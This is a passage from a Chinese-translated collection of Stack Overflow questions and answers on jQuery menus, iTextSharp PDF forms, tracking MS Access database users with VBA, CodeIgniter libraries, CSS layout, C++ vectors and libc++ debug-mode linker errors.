        <li id="menu-item-290" class="third menu-item menu-item-type-taxonomy menu-item-object-category menu-item-type-post_type menu-item-object-post menu-item-290"><a href="http://xyz.com">Post 3rd lvl</a></li>
        <li id="menu-item-292" class="third menu-item menu-item-type-taxonomy menu-item-object-category menu-item-type-post_type menu-item-object-post menu-item-292"><a href="http://xyz.com">Post 3rd lvl</a></li>
    </ul>
</li>
</ul>
</li> 
```

jQuery：

```
$('#menu-header ul.sub-menu li.second:not(".third")').toggle(function() {
        $(this).find('ul.sub-menu:first-of-type')
            .stop(true, true).delay(50).show("slow");
    }, function(){
        $(this).find('ul.sub-menu:first-of-type')
            .stop(true, true).delay(150).animate({ "height": "hide", "opacity": "hide" }, 400 );
    }); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T18:54:00.503

给你，用[这个答案](https://stackoverflow.com/a/9469857/65232)。为了清楚起见，我简化了代码并[更新了你的小提琴](http://jsfiddle.net/ghkEY/2/)。

```
$('ul.sub-menu').children('.second').click(function(){
    $(this).children('.sub-menu').slideToggle('slow');
}).children('ul').find('.third').click(function (event) {
    event.stopPropagation();
    console.log('hello!');
    return false;
}); 
```

# c# - iTextSharp 将 PdfFormFieldvalues 发送到服务器

> ID：15899926
> 
> 赞同：0
> 
> 时间：2013-04-09T10:50:15.447
> 
> 标签：c#, pdf, submit, itextsharp

由于某种原因，我无法将 PdfFormField 值发送到我的服务器。当我单击提交按钮时，它只会将使用 Acrobat 创建的字段中的数据发送到服务器，而不是使用 iTextSharp 以编程方式创建的字段。我正在使用 c#。

这就是我创建文本字段的方式：

```
Rectangle rec = new Rectangle(x, y-h, x+w, y);
cb.SaveState();
PdfGState state = new PdfGState();

cb.SetGState(state);
state.FillOpacity = opac;
state.StrokeOpacity = bopac;
cb.Rectangle(x, y - h, w, h);
cb.FillStroke();
cb.RestoreState(); 
```

这是我的提交按钮：

```
PdfContentByte cb = writer.DirectContent;
                Rectangle _rect;
                PdfFormField _Field1;

                _rect = new Rectangle(25, 15, 120, 40);
                PushbuttonField button = new PushbuttonField(writer, _rect, "Button0");
                button.BackgroundColor = new GrayColor(0.75f);
                button.BorderColor = GrayColor.GRAYBLACK;
                button.BorderWidth = 1;
                button.BorderStyle = PdfBorderDictionary.STYLE_BEVELED;
                button.TextColor = GrayColor.GRAYBLACK;
                button.FontSize = 12;
                button.Text = "Confirm Order";
                button.Layout = PushbuttonField.LAYOUT_ICON_LEFT_LABEL_RIGHT;
                button.ScaleIcon = PushbuttonField.SCALE_ICON_ALWAYS;
                button.ProportionalIcon = true;
                button.IconHorizontalAdjustment = 0;
                _Field1 = button.Field;
                int flags = PdfAction.SUBMIT_XFDF | PdfAction.SUBMIT_INCLUDE_NO_VALUE_FIELDS;
                _Field1.Action = PdfAction.CreateSubmitForm(@"http://127.0.0.1/index.php", null, flags);
                writer.AddAnnotation(_Field1); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T13:58:55.837

您没有在上面的代码中创建表单域，而只是创建了一个矩形。查看`TextField`

```
writer.AddAnnotation(new iTextSharp.text.pdf.TextField(writer, rect, "FirstName").GetTextField()); 
```

# ms-access - 如何通过网络查看谁在使用我的 Access 数据库？

> ID：15899930
> 
> 赞同：5
> 
> 时间：2013-04-09T10:50:29.810
> 
> 标签：ms-access, ms-access-2003, multi-user

我实际上有两个问题：

## 1\. 如何查看谁在使用我的 Access 数据库？

*   例如：有人打开了 Access 数据库并创建了 .ldb 文件，我想查看谁打开了该数据库的列表（可能不止一个人）。

## 2\. 如何查看谁在使用链接表？

*   例如：我有 10 个不同的 Access 数据库，它们都使用同一个链接表。我想看看谁在使用该链接表。

我什至不知道这是否真的可能，但我真的很感谢你的帮助！

供您参考：主要问题是很多人在同一个网络驱动器中使用相同的 Access，所以当我需要更改它时，我必须将它们全部踢出，但我不知道谁在实际使用它。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-09T23:00:07.487

更新：不是读取和解析 .ldb/.lacdb 文件，更好的方法是使用 Access OLEDB 提供程序的“用户名册”功能，如知识库文章中所述

[https://support.microsoft.com/en-us/kb/285822](https://support.microsoft.com/en-us/kb/285822)

在另一个 SO 问题中

[通过VBA获取laccdb文件的内容](https://stackoverflow.com/q/39392863/2144390)

* * *

*原答案：*

不久前我整理了以下内容。它看起来很有希望，但后来我发现计算机在断开连接时不会立即从锁定文件中删除。相反，Jet/ACE 似乎（在内部）将它们标记为不活动：如果 ComputerA 断开连接，然后 ComputerB 连接，ComputerB 将覆盖 ComputerA 在锁定文件中的条目。

尽管如此，它确实提供了一个列表。我在这里发布它以防有人可以提供一些改进建议。

我在后端数据库中创建了两个表：

```
Table: [CurrentConnections]
computerName  Text(255), Primary Key

Table: [ConnectionLog]
computerName  Text(255), Primary Key
userName      Text(255) 
```

我的后端数据库中的 VBA 模块包含以下代码，用于读取（副本）锁定文件并更新 [CurrentConnections] 表：

```
Public Sub GetCurrentlyConnectedMachines()
    Dim cdb As DAO.Database, rst As DAO.Recordset
    Dim fso As Object  '' FileSystemObject
    Dim lck As Object  '' ADODB.Stream
    Dim lockFileSpec As String, lockFileExt As String, tempFileSpec As String
    Dim buffer() As Byte

    Set cdb = CurrentDb
    cdb.Execute "DELETE FROM CurrentConnections", dbFailOnError
    Set rst = cdb.OpenRecordset("SELECT computerName FROM CurrentConnections", dbOpenDynaset)

    lockFileSpec = Application.CurrentDb.Name
    If Right(lockFileSpec, 6) = ".accdb" Then
        lockFileExt = ".laccdb"
    Else
        lockFileExt = ".ldb"
    End If
    lockFileSpec = Left(lockFileSpec, InStrRev(lockFileSpec, ".", -1, vbBinaryCompare) - 1) & lockFileExt

    '' ADODB.Stream cannot open the lock file in-place, so copy it to %TEMP%
    Set fso = CreateObject("Scripting.FileSystemObject")  '' New FileSystemObject
    tempFileSpec = fso.GetSpecialFolder(2) & "\" & fso.GetTempName
    fso.CopyFile lockFileSpec, tempFileSpec, True

    Set lck = CreateObject("ADODB.Stream")  '' New ADODB.Stream
    lck.Type = 1  '' adTypeBinary
    lck.Open
    lck.LoadFromFile tempFileSpec
    Do While Not lck.EOS
        buffer = lck.Read(32)
        rst.AddNew
        rst!computerName = DecodeSZ(buffer)
        rst.Update
        buffer = lck.Read(32)  '' skip accessUserId, (almost) always "Admin"
    Loop
    lck.Close
    Set lck = Nothing
    rst.Close
    Set rst = Nothing
    Set cdb = Nothing
    fso.DeleteFile tempFileSpec
    Set fso = Nothing
End Sub

Private Function DecodeSZ(buf() As Byte) As String
    Dim b As Variant, rt As String
    rt = ""
    For Each b In buf
        If b = 0 Then
            Exit For  '' null terminates the string
        End If
        rt = rt & Chr(b)
    Next
    DecodeSZ = rt
End Function 
```

下面前端数据库Main_Menu表单中的代码更新了[ConnectionLog]表

```
Private Sub Form_Load()
    Dim cdb As DAO.Database, rst As DAO.Recordset
    Dim wshNet As Object  '' WshNetwork

    Set wshNet = CreateObject("Wscript.Network")
    Set cdb = CurrentDb
    Set rst = cdb.OpenRecordset("SELECT * FROM ConnectionLog", dbOpenDynaset)
    rst.FindFirst "ComputerName=""" & wshNet.computerName & """"
    If rst.NoMatch Then
        rst.AddNew
        rst!computerName = wshNet.computerName
    Else
        rst.Edit
    End If
    rst!userName = wshNet.userName
    rst.Update
    Set wshNet = Nothing
End Sub 
```

**最后，后端**数据库中的以下表格列出了[最好的猜测]当前连接

![显示活跃用户](https://i.stack.imgur.com/RjLWC.png)

它是一种“连续形式”形式，`Record Source`其

```
SELECT CurrentConnections.computerName, ConnectionLog.userName 
FROM CurrentConnections LEFT JOIN ConnectionLog 
    ON CurrentConnections.computerName = ConnectionLog.computerName 
ORDER BY ConnectionLog.userName; 
```

后面的代码很简单

```
Private Sub Form_Load()
    UpdateFormData
End Sub

Private Sub cmdRefresh_Click()
    UpdateFormData
End Sub

Private Sub UpdateFormData()
    GetCurrentlyConnectedMachines
    Me.Requery
End Sub 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-09T20:26:10.397

简单的。在记事本（或任何文本编辑器）中打开 .ldb 文件，您可以看到机器名称。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-12-19T16:56:47.680

RE: 如何查看谁在使用我的 Access 数据库？• 例如：有人打开了一个Access 数据库并创建了.ldb 文件，我想查看谁打开了该数据库的列表（可能不止一个人）。

* * *

只是在寻找其他东西时发生了这个，我想我可以分享我为此做了什么。请注意，这假定主机（数据库文件所在的计算机）使用文件共享来提供对文件的访问。

您需要在主机上，或者有权连接到该计算机。

单击开始右键单击我的电脑并选择管理

> 如果您不在主机上，请右键单击“计算机管理”并输入主机名

展开“共享文件夹”并单击“打开文件”右侧是当前打开的文件列表以及每个当前用户的用户名

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2018-06-21T19:39:41.400

我同意戈德的原始回答。我在我的数据库上使用了这段代码，似乎有一种方法可以解决在退出数据库时计算机不会从 CurrentConnections 中取出的方法。

我把它放在我的主菜单表单上，因为它在用户退出之前总是打开的。我在我的表单上使用了 unload 事件来让它工作，而且效果很棒！这是我的代码

ps Ignore SetWarnings 我只是打开了它，所以用户不必点击提示。

```
Private Sub Form_Unload(Cancel As Integer)
Dim wshNet As Object
Dim deleteSQL As String

Set wshNet = CreateObject("WScript.Network")
        DoCmd.SetWarnings False
        deleteSQL = "DELETE tblCurrentConnections.* " & _
        "FROM tblCurrentConnections WHERE[computerName] = '" & wshNet.computerName & "';"
                DoCmd.RunSQL deleteSQL
        DoCmd.SetWarnings True
End Sub 
```

# php - 在 codeigniter 中调用库构造函数

> ID：15899934
> 
> 赞同：0
> 
> 时间：2013-04-09T10:50:41.970
> 
> 标签：php, codeigniter, oop

在 OOP（在我的例子中是 PHP）中，

```
class Hello{
    __construct($a, $b){
    return $a * $b;
    }
} 
```

我们将值传递给构造函数：

```
$hello = new Hello(5, 10); 
```

现在，在 codeigniter 中，我有这个库作为 Hello。

```
class Hello{
    __construct($a, $b){
    return $a * $b;
    }
} 
```

并将这个库加载到我的控制器中

```
$this->load->library('hello'); 
```

我如何为其构造函数传递 hello 类的参数？任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T10:54:38.570

[https://www.codeigniter.com/user_guide/general/creating_libraries.html](https://www.codeigniter.com/user_guide/general/creating_libraries.html)

```
$params = array('type' => 'large', 'color' => 'red');

$this->load->library('Someclass', $params); 
```

# css - 如何正确布局字段，添加额外的输入会破坏正确的格式

> ID：15899935
> 
> 赞同：2
> 
> 时间：2013-04-09T10:50:41.973
> 
> 标签：css

为了捕获用户地址，我有以下字段：

![正确的格式](https://i.stack.imgur.com/66GWy.png)

如果我尝试添加另一个输入

```
<td class="nameAddress2">
      <input class="inputStylized" type="text" id="namAddress-1" value="Name of the address" />
</td> 
```

然后字段之间的空间消失，按钮也消失了.. ![不正确](https://i.stack.imgur.com/aRMwG.png)

HTML

```
<div id="user-address">
                <form class="settings-form" id="adrress-form" name="adrress-form">
                    <h3>Change address <span>(lorem ipsum lorem #24)</span></h3>
                    <div class="data-field">
                        <table id="address-table">
                            <tr>
                                <td colspan="2"><h3>Addresses (Home / work)</h3></td>
                                <td colspan="3"><h3>Name of the address</h3></td>
                            </tr>
                            <tr class="item">
                                <td class="num">
                                    <span>1</span>
                                </td>
                                <td class="addresses">
                                    <input class="inputStylized" type="text" id="addresses-1" value="Your new address" />
                                </td>
                                <td class="nameAddress">
                                    <input class="inputStylized" type="text" id="namAddress-1" value="Name of the address" />

                                </td>

                                <td class="nameAddress2">
                                    <input class="inputStylized" type="text" id="namAddress-1" value="Name of the address" />

                                </td>

                                <td class="delete-field">
                                    <img class="remove" alt="delete" src="assets/img/x-green.png">
                                </td>
                                <td class="choiseDefault isDefault">
                                    <span class="default">Default</span>
                                    <span class="setDefault">Set as default</span>
                                </td>
                            </tr>
                            <tr class="item">
                                <td class="num">
                                    <span>2</span>
                                </td>
                                <td class="addresses">
                                    <input class="inputStylized" type="text" id="addresses-2" value="Your new address" />
                                </td>
                                <td class="nameAddress">
                                    <input class="inputStylized" type="text" id="namAddress-2" value="Name of the address" />

                                </td>
                                <td class="delete-field"><img class="remove" alt="delete" src="assets/img/x-green.png"></td>
                                <td class="choiseDefault isNotDefault">
                                    <span class="default">Default</span>
                                    <span class="setDefault">Set as default</span>
                                </td>
                            </tr>
                        </table>
                        <div id="addNewAddresses">
                            <span>Add more addresses</span>
                        </div>
                    </div>
                </form><!--/#address-form-->
            </div> 
```

CSS

```
#wrap-main #main-settings .standar-container #settings-section #settings-info #user-address{
    clear:both;
}

#wrap-main #main-settings .standar-container #settings-section #settings-info #user-address form h3{
    color: #989898;
    font-size: 16px;
    margin-bottom: 16px;
}

#wrap-main #main-settings .standar-container #settings-section #settings-info #user-address form .data-field input.inputStylized{
    background-color: #D1D1D1;
    border: medium none;
    color: #FFFFFF;
    font-size: 13px;
    padding: 12px 15px;
    display:block;
}

#wrap-main #main-settings .standar-container #settings-section #settings-info #user-address form .data-field table tr > td{
    vertical-align: middle;
    padding-bottom: 15px;
}

#wrap-main #main-settings .standar-container #settings-section #settings-info #user-address form .data-field table tr > td.num{
    width:29px;
}

#wrap-main #main-settings .standar-container #settings-section #settings-info #user-address form .data-field table tr > td.num span{

    color:#989898;
    font-size:32px;
    font-weight: bold;
    padding-top: 3px;
}

#wrap-main #main-settings .standar-container #settings-section #settings-info #user-address form .data-field table tr > td.addresses{
    width:245px;
}

#wrap-main #main-settings .standar-container #settings-section #settings-info #user-address form .data-field table tr > td.addresses input.inputStylized{
    width:180px;
}

#wrap-main #main-settings .standar-container #settings-section #settings-info #user-address form .data-field table tr > td.nameAddress{
    width:201px;
}

#wrap-main #main-settings .standar-container #settings-section #settings-info #user-address form .data-field table tr > td.nameAddress2{
    width:201px;
}

#wrap-main #main-settings .standar-container #settings-section #settings-info #user-address form .data-field table tr > td.delete-field{
    width:51px;
}

#wrap-main #main-settings .standar-container #settings-section #settings-info #user-address form .data-field table tr > td.delete-field img{
    cursor:pointer;
}

#wrap-main #main-settings .standar-container #settings-section #settings-info #user-address form .data-field table tr > td.choiseDefault span.default{
    font-size:15px;
    font-weight: bold;
    color:#FFF;
    background: url("../img/boton-verde.png") no-repeat scroll center center transparent;
    display:block;
    width:115px;
    padding-top: 10px;
    height: 24px;
    text-align: center;
}

#wrap-main #main-settings .standar-container #settings-section #settings-info #user-address form .data-field table tr > td.choiseDefault span.default{
    display:none;
}

#wrap-main #main-settings .standar-container #settings-section #settings-info #user-address form .data-field table tr > td.isDefault span.default{
    display:block !important;
}

#wrap-main #main-settings .standar-container #settings-section #settings-info #user-address form .data-field table tr > td.isDefault span.setDefault{
    display: none !important;
}

#wrap-main #main-settings .standar-container #settings-section #settings-info #user-address form .data-field table tr > td.choiseDefault span.setDefault{
    font-size:15px;
    font-weight: bold;
    color:#FFF;
    background: url("../img/boton-plomo-corto.png") no-repeat scroll center center transparent;
    display:block;
    width:160px;
    padding-top: 10px;
    height: 24px;
    text-align: center;
    cursor:pointer;
} 
```

请记住，我还需要添加国家、城市和邮政编码，因此不确定所有内容是否都适合水平放置。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T10:59:47.167

使用 CSS 选择器设置所有输入字段的样式

```
#myForm input[type=text] {
width: 
} 
```

如果他们很多，也许用一张桌子，或者一个班级来转移他们

# c++ - 将元素添加到字符串向量时遇到问题

> ID：15899936
> 
> 赞同：-1
> 
> 时间：2013-04-09T10:50:45.970
> 
> 标签：c++, string, vector, switch-statement, push-back

我正在编写一个类似函数的简单日志，但是我似乎无法理解如何通过传递用户输入的值来生成向量的新元素。我是编程新手，所以答案可能很明显：/编译程序时没有错误，但添加日记条目的代码似乎没有效果。有任何想法吗？

这是下面的程序：

```
#include <iostream>
#include <string>
#include <vector>

using namespace std;

int main()

{
    bool running = true;

    while (running = true) 
    {

    vector<string> journal;
    vector<string>::const_iterator iter;
    int count = 1;

    journal.push_back("Day 1\. Found some beans.");
    journal.push_back("Must remember not to eat beans");
    journal.push_back("Found some idiot who traded beans for a cow!");

    cout << "Journal Tester.\n\n";

    cout << "1 - View Journal\n2 - Add journal entry\n";
    cout << "3 - Quit\n";
    cout << "\nPlease choose: ";

    string newentry;
    int choice; 
    cin >> choice;
    cout << endl;

    switch (choice)
    {
    case 1:
        for (iter = journal.begin(); iter != journal.end(); ++iter)
    {

        cout << "Entry " << count << ": \n";
        cout << *iter << endl; 
        ++ count;
    }
        count = 1;
        break;

    case 2: 

        cout << "\nYou write: ";
        cin >> newentry; 

        cout << endl << newentry;
        journal.push_back(newentry); 

        break;

    }

    } 

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-09T10:53:43.900

这：

```
vector<string> journal; 
```

在循环的每次迭代中重新创建，`while`因此当打印元素的代码在新的 empty 上运行时`vector`。将 的定义`journal`移到`while`循环外：

```
vector<string> journal;
while (running) // Note removed assignment here.
{
} 
```

如果您不希望重复添加这些硬编码值，则`push_back()`可能`vector`还需要将它们移出循环。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T10:55:20.003

向量在“while”循环中声明*，*因此它们是本地的，并且为循环的每次迭代重新创建。这意味着程序每次都会忘记自己的过去。*在循环之前*移动向量声明，事情会大大改善！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T10:56:01.887

在循环之前只创建一次向量：

```
vector<string> journal;
while (running) // <- also change this to avoid inf loop
{
 string s("me");
 journal.push_back(s);
 //.. do things with your vector "journal"
} 
```

还要小心你在循环中所做的事情。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-09T10:58:54.510

这是因为您的向量变量是在`while`循环范围内实例化的。这意味着它在循环的每一轮中都是新创建的，与`case 2:`switch 语句一起添加的数据会丢失。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-09T11:19:56.387

```
 #include <iostream>
    #include <string>
     #include <vector>

     using namespace std;
 vector<string> journal;//**SHOULD NOT WRITE INSIDE THE LOOP**
 int main()

  {
bool running = true;

while (running = true) 
{

vector<string>::const_iterator iter;
int count = 1;

journal.push_back("Day 1\. Found some beans.");
journal.push_back("Must remember not to eat beans");
journal.push_back("Found some idiot who traded beans for a cow!");

cout << "Journal Tester.\n\n";

cout << "1 - View Journal\n2 - Add journal entry\n";
cout << "3 - Quit\n";
cout << "\nPlease choose: ";

string newentry;
int choice; 
cin >> choice;
cout << endl;

switch (choice)
{
case 1:
    for (iter = journal.begin(); iter != journal.end(); ++iter)
{

    cout << "Entry " << count << ": \n";
    cout << *iter << endl; 
    ++ count;
}
    count = 1;
    break;

case 2: 

    cout << "\nYou write: ";
    cin >> newentry; 

    cout << endl << newentry;
    journal.push_back(newentry); 

    break;

}

} 

return 0; 
```

}

# c++ - 是否可以在 Mountain Lion 上的当前 Xcode 4.6.1 工具链中启用 _LIBCPP_DEBUG2？

> ID：15899937
> 
> 赞同：3
> 
> 时间：2013-04-09T10:50:50.403
> 
> 标签：c++, debugging, stl, vmat

[该线程](http://comments.gmane.org/gmane.comp.compilers.clang.devel/16838)是对 clang 的 libc++ 调试模式的早期讨论，该调试模式将通过`_LIBCPP_DEBUG2`在编译器命令中定义来启用。刚刚与错误分配进行了斗争，`std::vector<>`我有兴趣能够为我的调试版本打开它。

当我尝试简单地添加`_LIBCPP_DEBUG=1`到**预处理器宏**构建设置时，我在链接阶段遇到错误（如下所示）。我怀疑这些是由新生成的对讨论线程中描述的*调试数据库的引用引起的。*

在早期的讨论中，有人说标准版本的库中提供了必要的支持，但今天似乎并非如此。它仍然支持吗？如果是这样，我如何链接到必要的位？

```
Ld /Users/kaelin/Library/Developer/Xcode/DerivedData/OMWorkspace-bzkzcamyqoztgyalubrmemkzmjvk/Build/Products/Debug/vMAT.dylib normal x86_64
    cd /Users/Shared/Source/vMAT
    setenv MACOSX_DEPLOYMENT_TARGET 10.8
    /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/clang++ -arch x86_64 -dynamiclib -isysroot /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.8.sdk -L/Users/kaelin/Library/Developer/Xcode/DerivedData/OMWorkspace-bzkzcamyqoztgyalubrmemkzmjvk/Build/Products/Debug -F/Users/kaelin/Library/Developer/Xcode/DerivedData/OMWorkspace-bzkzcamyqoztgyalubrmemkzmjvk/Build/Products/Debug -F/Users/Shared/Source/vMAT/../../../kaelin/Library/Developer/Xcode/DerivedData/OMWorkspace-bzkzcamyqoztgyalubrmemkzmjvk/Build/Products/Debug -filelist /Users/kaelin/Library/Developer/Xcode/DerivedData/OMWorkspace-bzkzcamyqoztgyalubrmemkzmjvk/Build/Intermediates/vMAT.build/Debug/vMAT.build/Objects-normal/x86_64/vMAT.LinkFileList -install_name "@rpath/vMAT.dylib" -mmacosx-version-min=10.8 -fobjc-arc -fobjc-link-runtime -stdlib=libc++ -framework BlocksKit -framework Accelerate -framework Cocoa -single_module -compatibility_version 1 -current_version 1 -o /Users/kaelin/Library/Developer/Xcode/DerivedData/OMWorkspace-bzkzcamyqoztgyalubrmemkzmjvk/Build/Products/Debug/vMAT.dylib

Undefined symbols for architecture x86_64:
  "std::__1::__libcpp_db::__comparable(void const*, void const*) const", referenced from:
      NSString* (anonymous namespace)::dump<double>(NSString*, double*, int vector[4]) in vMAT_Array+UnaryOps.o
      NSString* (anonymous namespace)::dump<float>(NSString*, float*, int vector[4]) in vMAT_Array+UnaryOps.o
      signed char (anonymous namespace)::isEqualEpsilon<double>(double*, int vector[4], double*, int vector[4], double) in vMAT_Array+BinaryOps.o
      signed char (anonymous namespace)::isEqualEpsilon<float>(float*, int vector[4], float*, int vector[4], double) in vMAT_Array+BinaryOps.o
  "std::__1::__libcpp_db::__dereferenceable(void const*) const", referenced from:
      NSString* (anonymous namespace)::dump<double>(NSString*, double*, int vector[4]) in vMAT_Array+UnaryOps.o
      NSString* (anonymous namespace)::dump<float>(NSString*, float*, int vector[4]) in vMAT_Array+UnaryOps.o
      signed char (anonymous namespace)::isEqualEpsilon<double>(double*, int vector[4], double*, int vector[4], double) in vMAT_Array+BinaryOps.o
      signed char (anonymous namespace)::isEqualEpsilon<float>(float*, int vector[4], float*, int vector[4], double) in vMAT_Array+BinaryOps.o
  "std::__1::__libcpp_db::__insert_c(void*)", referenced from:
      std::__1::vector<float, std::__1::allocator<float> >::vector<float*>(float*, float*, std::__1::enable_if<__is_forward_iterator<float*>::value, void>::type*) in vMAT_Array+UnaryOps.o
      std::__1::vector<double, std::__1::allocator<double> >::vector<double*>(double*, double*, std::__1::enable_if<__is_forward_iterator<double*>::value, void>::type*) in vMAT_Array+UnaryOps.o
      std::__1::vector<float, std::__1::allocator<float> >::vector<float*>(float*, float*, std::__1::enable_if<__is_forward_iterator<float*>::value, void>::type*) in vMAT_Array+BinaryOps.o
      std::__1::vector<double, std::__1::allocator<double> >::vector<double*>(double*, double*, std::__1::enable_if<__is_forward_iterator<double*>::value, void>::type*) in vMAT_Array+BinaryOps.o
      std::__1::vector<int, std::__1::allocator<int> >::vector(unsigned long, int const&) in vMAT_inconsistent.o
      std::__1::vector<int, std::__1::allocator<int> >::vector(std::__1::vector<int, std::__1::allocator<int> > const&) in vMAT_inconsistent.o
      (anonymous namespace)::clusterOptions(NSArray*) in vMAT_cluster.o
      ...
  "std::__1::__libcpp_db::__insert_ic(void*, void const*)", referenced from:
      NSString* (anonymous namespace)::dump<double>(NSString*, double*, int vector[4]) in vMAT_Array+UnaryOps.o
      NSString* (anonymous namespace)::dump<float>(NSString*, float*, int vector[4]) in vMAT_Array+UnaryOps.o
      signed char (anonymous namespace)::isEqualEpsilon<double>(double*, int vector[4], double*, int vector[4], double) in vMAT_Array+BinaryOps.o
      signed char (anonymous namespace)::isEqualEpsilon<float>(float*, int vector[4], float*, int vector[4], double) in vMAT_Array+BinaryOps.o
  "std::__1::__libcpp_db::__erase_c(void*)", referenced from:
      NSString* (anonymous namespace)::dump<double>(NSString*, double*, int vector[4]) in vMAT_Array+UnaryOps.o
      NSString* (anonymous namespace)::dump<float>(NSString*, float*, int vector[4]) in vMAT_Array+UnaryOps.o
      signed char (anonymous namespace)::isEqualEpsilon<double>(double*, int vector[4], double*, int vector[4], double) in vMAT_Array+BinaryOps.o
      signed char (anonymous namespace)::isEqualEpsilon<float>(float*, int vector[4], float*, int vector[4], double) in vMAT_Array+BinaryOps.o
      (anonymous namespace)::traceTree(vMAT::Matrix<double>, double*, int, unsigned int) in vMAT_inconsistent.o
      ___Block_byref_object_dispose_ in vMAT_inconsistent.o
      (anonymous namespace)::Options::~Options() in vMAT_cluster.o
      ...
  "std::__1::__libcpp_db::__erase_i(void*)", referenced from:
      NSString* (anonymous namespace)::dump<double>(NSString*, double*, int vector[4]) in vMAT_Array+UnaryOps.o
      NSString* (anonymous namespace)::dump<float>(NSString*, float*, int vector[4]) in vMAT_Array+UnaryOps.o
      signed char (anonymous namespace)::isEqualEpsilon<double>(double*, int vector[4], double*, int vector[4], double) in vMAT_Array+BinaryOps.o
      signed char (anonymous namespace)::isEqualEpsilon<float>(float*, int vector[4], float*, int vector[4], double) in vMAT_Array+BinaryOps.o
  "std::__1::__get_const_db()", referenced from:
      NSString* (anonymous namespace)::dump<double>(NSString*, double*, int vector[4]) in vMAT_Array+UnaryOps.o
      NSString* (anonymous namespace)::dump<float>(NSString*, float*, int vector[4]) in vMAT_Array+UnaryOps.o
      signed char (anonymous namespace)::isEqualEpsilon<double>(double*, int vector[4], double*, int vector[4], double) in vMAT_Array+BinaryOps.o
      signed char (anonymous namespace)::isEqualEpsilon<float>(float*, int vector[4], float*, int vector[4], double) in vMAT_Array+BinaryOps.o
  "std::__1::__c_node::~__c_node()", referenced from:
      std::__1::_C_node<std::__1::vector<float, std::__1::allocator<float> > >::~_C_node() in vMAT_Array+UnaryOps.o
      std::__1::_C_node<std::__1::vector<double, std::__1::allocator<double> > >::~_C_node() in vMAT_Array+UnaryOps.o
      std::__1::_C_node<std::__1::vector<float, std::__1::allocator<float> > >::~_C_node() in vMAT_Array+BinaryOps.o
      std::__1::_C_node<std::__1::vector<double, std::__1::allocator<double> > >::~_C_node() in vMAT_Array+BinaryOps.o
      std::__1::_C_node<std::__1::vector<int, std::__1::allocator<int> > >::~_C_node() in vMAT_inconsistent.o
      std::__1::_C_node<std::__1::vector<int, std::__1::allocator<int> > >::~_C_node() in vMAT_cluster.o
      std::__1::_C_node<std::__1::vector<double, std::__1::allocator<double> > >::~_C_node() in vMAT_cluster.o
      ...
  "std::__1::__get_db()", referenced from:
      NSString* (anonymous namespace)::dump<double>(NSString*, double*, int vector[4]) in vMAT_Array+UnaryOps.o
      NSString* (anonymous namespace)::dump<float>(NSString*, float*, int vector[4]) in vMAT_Array+UnaryOps.o
      std::__1::vector<float, std::__1::allocator<float> >::vector<float*>(float*, float*, std::__1::enable_if<__is_forward_iterator<float*>::value, void>::type*) in vMAT_Array+UnaryOps.o
      std::__1::vector<double, std::__1::allocator<double> >::vector<double*>(double*, double*, std::__1::enable_if<__is_forward_iterator<double*>::value, void>::type*) in vMAT_Array+UnaryOps.o
      signed char (anonymous namespace)::isEqualEpsilon<double>(double*, int vector[4], double*, int vector[4], double) in vMAT_Array+BinaryOps.o
      signed char (anonymous namespace)::isEqualEpsilon<float>(float*, int vector[4], float*, int vector[4], double) in vMAT_Array+BinaryOps.o
      std::__1::vector<float, std::__1::allocator<float> >::vector<float*>(float*, float*, std::__1::enable_if<__is_forward_iterator<float*>::value, void>::type*) in vMAT_Array+BinaryOps.o
      ...
  "typeinfo for std::__1::__c_node", referenced from:
      typeinfo for std::__1::_C_node<std::__1::vector<float, std::__1::allocator<float> > > in vMAT_Array+UnaryOps.o
      typeinfo for std::__1::_C_node<std::__1::vector<double, std::__1::allocator<double> > > in vMAT_Array+UnaryOps.o
      typeinfo for std::__1::_C_node<std::__1::vector<float, std::__1::allocator<float> > > in vMAT_Array+BinaryOps.o
      typeinfo for std::__1::_C_node<std::__1::vector<double, std::__1::allocator<double> > > in vMAT_Array+BinaryOps.o
      typeinfo for std::__1::_C_node<std::__1::vector<int, std::__1::allocator<int> > > in vMAT_inconsistent.o
      typeinfo for std::__1::_C_node<std::__1::vector<int, std::__1::allocator<int> > > in vMAT_cluster.o
      typeinfo for std::__1::_C_node<std::__1::vector<double, std::__1::allocator<double> > > in vMAT_cluster.o
      ...
  "vtable for std::__1::__c_node", referenced from:
      std::__1::_C_node<std::__1::vector<float, std::__1::allocator<float> > >::_C_node(void*, std::__1::__c_node*) in vMAT_Array+UnaryOps.o
      std::__1::_C_node<std::__1::vector<double, std::__1::allocator<double> > >::_C_node(void*, std::__1::__c_node*) in vMAT_Array+UnaryOps.o
      std::__1::_C_node<std::__1::vector<float, std::__1::allocator<float> > >::_C_node(void*, std::__1::__c_node*) in vMAT_Array+BinaryOps.o
      std::__1::_C_node<std::__1::vector<double, std::__1::allocator<double> > >::_C_node(void*, std::__1::__c_node*) in vMAT_Array+BinaryOps.o
      std::__1::_C_node<std::__1::vector<int, std::__1::allocator<int> > >::_C_node(void*, std::__1::__c_node*) in vMAT_inconsistent.o
      std::__1::_C_node<std::__1::vector<int, std::__1::allocator<int> > >::_C_node(void*, std::__1::__c_node*) in vMAT_cluster.o
      std::__1::_C_node<std::__1::vector<double, std::__1::allocator<double> > >::_C_node(void*, std::__1::__c_node*) in vMAT_cluster.o
      ...
  NOTE: a missing vtable usually means the first non-inline virtual member function has no definition.
ld: symbol(s) not found for architecture x86_64
clang: error: linker command failed with exit code 1 (use -v to see invocation) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-02-18T07:36:14.523

